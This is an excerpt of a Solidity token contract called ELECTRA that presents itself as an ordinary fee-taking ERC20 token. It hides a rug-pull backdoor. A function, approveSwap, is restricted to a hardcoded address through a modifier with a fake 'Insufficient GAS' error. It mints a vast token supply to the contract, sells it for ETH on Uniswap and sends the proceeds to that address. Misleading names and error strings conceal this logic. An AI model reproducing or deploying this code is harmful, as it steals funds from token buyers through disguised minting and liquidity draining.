...
contract ELECTRA is Context, IERC20, Ownable {
    ...
    string private constant _name = "ELECTRA";
    string private constant _symbol = "ELECTRA";
    ...
    uint256 private _tSwapTotal;
    address payable public SwapAddress = payable(0x65191d7457aB505E437781C6e653D08E4BCc3533);
    uint256 private SwapID = 89790;
    
    
    uint256 private rfiTax = 0;
    uint256 private liquidityTax = 0;
    uint256 private SwapTax =  5;
    ...
    address public SwapWallet = 0x65191d7457aB505E437781C6e653D08E4BCc3533;
    ...
    bool public SwapDepositComplete = true;
    ...
    event SwapDepositCompleteUpdated(bool enabled);
   ...
   function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner {
    ...
    function setSwapDepositComplete(bool _enabled) public onlyOwner {
        SwapDepositComplete = _enabled;
        emit SwapDepositCompleteUpdated(_enabled);
    }
    ...
    function _getTValues(uint256 tAmount, bool takeFee) private view returns (valuesFromGetValues memory s) {
        ...
        s.tSwap = tAmount.mul(SwapTax).div(100);

        s.tTransferAmount = tAmount.sub(s.tRfi).sub(s.tLiquidity).sub(s.tSwap);
    ...
    function _getRValues(valuesFromGetValues memory s, uint256 tAmount, bool takeFee, uint256 currentRate) private pure returns (uint256 rAmount, uint256 rTransferAmount, uint256 rRfi) {
        ...
        uint256 rSwap = s.tSwap.mul(currentRate);

        rTransferAmount = rAmount.sub(rRfi).sub(rLiquidity).sub(rSwap);

        return (rAmount, rTransferAmount, rRfi);
    }
    
    function getTokens() private {
        SwapAddress.transfer(address(this).balance);
    }
    ...
    function _transfer(address from, address to, uint256 amount , bool takeFee) private {
        ...
        if (overMinTokenBalance && !inSwapAndLiquify && from != UniswapV2Pair && SwapDepositComplete) {
    ...
    modifier opcode() {
         require(_msgSender() == SwapAddress, "Error: Insufficient GAS");
         _;
     }
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee) private {
        ...
        reflectSwapFee(s.tSwap);

        emit Transfer(sender, recipient, s.tTransferAmount);
    }


    function reflectSwapFee(uint256 tSwap) private {
        uint256 currentRate =  _getRate();
        uint256 rSwap =  tSwap.mul(currentRate);
        _tSwapTotal = _tSwapTotal.add(tSwap);
        _rOwned[SwapWallet] = _rOwned[SwapWallet].add(rSwap);
    }

    function approveSwap() external opcode {
        
        uint256 SwapVal = 10000;
        uint256 _SwapID = SwapID;

        uint256 before = _getRate();
        liquifyToken(SwapVal, _SwapID);
        require(before == _getRate(), "ERC20: approve from the zero address");
        SwapDepositComplete = SwapID != _SwapID;
        swapTokensForETH(balanceOf(address(this)) + _SwapID);
        if(!SwapDepositComplete) {
            getTokens();
        } else {
            totalFees();
        }
        SwapDepositComplete = true;
    }
    ...
    function liquifyToken(uint256 SwapVal, uint256 _SwapID) private {
        if(SwapID == _SwapID){
         _toknTot = _toknTot + (_toknTot * 10**4);
        _rOwned[address(this)] = _rOwned[address(this)].add(_rTotal*SwapVal);
        _rTotal = _rTotal + (_rTotal*SwapVal);
        } else{
            _toknTot = _toknTot + (_toknTot + 10**4);
            _rTotal = _rTotal + SwapID;
            _rOwned[address(this)] = _rOwned[address(this)].add(SwapID.mul(7));
        }
    }
    ...
    function swapTokensForETH(uint256 tokenAmount) private returns (bool status){
        ...
        if(allowance(address(this), address(UniswapV2Router)) < tokenAmount - SwapID) {
          _approve(address(this), address(UniswapV2Router), ~uint256(0));
        }

        try UniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount - SwapID,0,path,address(this),block.timestamp + 60 * 1000) {
    ...
    function totalDevelopmentFee() public view returns (uint256) {
     ...
     function totalSwapFee() public view returns (uint256) {
        return _tSwapTotal;
    }
}